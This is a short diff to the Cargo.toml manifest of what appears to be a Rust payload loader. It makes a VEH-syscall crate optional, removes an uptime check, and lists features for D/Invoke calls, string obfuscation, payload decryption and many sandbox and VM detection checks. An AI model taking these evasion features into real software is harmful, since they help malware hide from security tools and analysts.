@@ -40,7 +40,7 @@ elliptic-curve = { version = "0.13", features = ["ecdh"] }
 hkdf = "0.12"
 rand = "0.8"
 dinvoke_rs = "0.2.0"
-rust-veh-syscalls = { path = "RustVEHSyscalls" }
+rust-veh-syscalls = { path = "RustVEHSyscalls", optional = true }
 colored = "2.0"
 cryptify = "3.1.1"
 rsl-macros = { path = "rsl-macros" }
@@ -65,7 +65,7 @@ load_payload_cmdline = []
 
 # veh Syscall
 
-veh_syscall = []
+veh_syscall = ["dep:rust-veh-syscalls"]
 
 # 解密算法特性开关
 none_decode = []
@@ -129,7 +129,6 @@ vm_check_prime = ["sandbox"]
 vm_check_tick = ["sandbox"]
 vm_check_api_flood = ["sandbox"]
 vm_check_mouse = ["sandbox"]
-vm_check_uptime = ["sandbox"]
 vm_check_usb_mount = ["sandbox"]
 vm_check_cpu_info = ["sandbox"]
 vm_check_rdtsc_timing = ["sandbox"]
